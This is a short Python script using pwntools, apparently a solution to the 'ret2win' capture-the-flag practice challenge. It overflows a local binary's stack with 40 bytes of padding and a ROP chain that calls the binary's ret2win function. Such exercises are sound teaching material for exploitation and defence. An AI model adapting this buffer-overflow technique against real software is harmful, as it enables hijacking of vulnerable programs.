from pwn import *
context(os='linux',arch='amd64')
p = process('./ret2win')
junk = b'A'*40
e = ELF('./ret2win')
r = ROP(e)
r.call(e.symbols['ret2win'])
print(r.dump())
p.sendline(junk + r.chain())
print(p.recvall().decode('utf-8')) 
